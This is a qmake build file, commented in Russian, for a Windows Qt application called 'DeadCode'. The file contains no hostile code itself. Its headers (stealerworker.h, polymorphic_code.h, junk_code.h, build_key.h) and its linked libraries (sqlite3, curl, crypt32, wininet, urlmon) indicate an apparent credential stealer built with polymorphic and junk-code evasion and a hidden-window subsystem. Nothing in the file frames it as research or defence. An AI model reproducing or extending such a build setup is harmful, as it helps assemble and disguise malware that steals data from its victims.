# Основные модули Qt
QT += core gui network widgets sql

# Имя цели и шаблон приложения
TARGET = DeadCode
TEMPLATE = app
CONFIG += release c++17

# Исходные файлы
SOURCES += \
    ../src/main.cpp \
    mainwindow.cpp

# Заголовочные файлы
HEADERS += \
    mainwindow.h \
    ../src/build_key.h \
    ../src/polymorphic_code.h \
    ../src/junk_code.h \
    ../src/stealerworker.h

# Формы Qt Designer
FORMS += \
    mainwindow.ui

# Ресурсы (иконка приложения)
RC_FILE = ../icon.rc

# Пути для включения заголовков
INCLUDEPATH += \
    ../src \
    . \
    C:/vcpkg/installed/x64-windows/include

# Библиотеки для линковки
LIBS += -LC:/vcpkg/installed/x64-windows/lib \
        -lsqlite3 \
        -lcurl \
        -lssl \
        -lcrypto \
        -lzip \
        -lbcrypt \
        -lws2_32 \
        -lgdiplus \
        -liphlpapi \
        -lpsapi \
        -lshlwapi \
        -lcrypt32 \
        -lgdi32 \
        -luser32 \
        -ladvapi32 \
        -lwininet \
        -lshell32 \
        -lurlmon \
        -lole32

# Флаги компиляции
QMAKE_CXXFLAGS += -O2 \
                  -Wall \
                  -Wextra \
                  -Werror=return-type \
                  -DUNICODE \
                  -D_UNICODE \
                  -DWIN32 \
                  -DQT_NO_DEBUG \
                  -D_CRT_SECURE_NO_WARNINGS

# Флаги линковки
QMAKE_LFLAGS += -O2 \
                -Wl,-subsystem,windows \
                -mthreads

# Определения для сборки
DEFINES += BUILD_DATE=\\\"$${QMAKE_BUILD_DATE}\\\" \
           BUILD_VERSION=\\\"$${QMAKE_BUILD_VERSION}\\\"

# Директории для сборки
DESTDIR = ../build/release
OBJECTS_DIR = ../build/release
MOC_DIR = ../build/release
UI_DIR = ../build/release

# Очистка при сборке
QMAKE_CLEAN += \
    $$DESTDIR/DeadCode.exe \
    $$OBJECTS_DIR/*.o \
    $$MOC_DIR/moc_*.cpp \
    $$UI_DIR/ui_*.h

# Настройки для Windows
win32 {
    CONFIG(debug, debug|release) {
        QMAKE_CXXFLAGS += -g
        QMAKE_LFLAGS -= -O2
        DESTDIR = ../build/debug
        OBJECTS_DIR = ../build/debug
        MOC_DIR = ../build/debug
        UI_DIR = ../build/debug
        QMAKE_CLEAN += \
            $$DESTDIR/DeadCode.exe \
            $$OBJECTS_DIR/*.o \
            $$MOC_DIR/moc_*.cpp \
            $$UI_DIR/ui_*.h
    }
}

# Зависимости перед сборкой
PRE_TARGETDEPS += \
    ../src/build_key.h \
    ../src/polymorphic_code.h \
    ../src/junk_code.h \
    ../src/stealerworker.h \
    $$UI_DIR/ui_mainwindow.h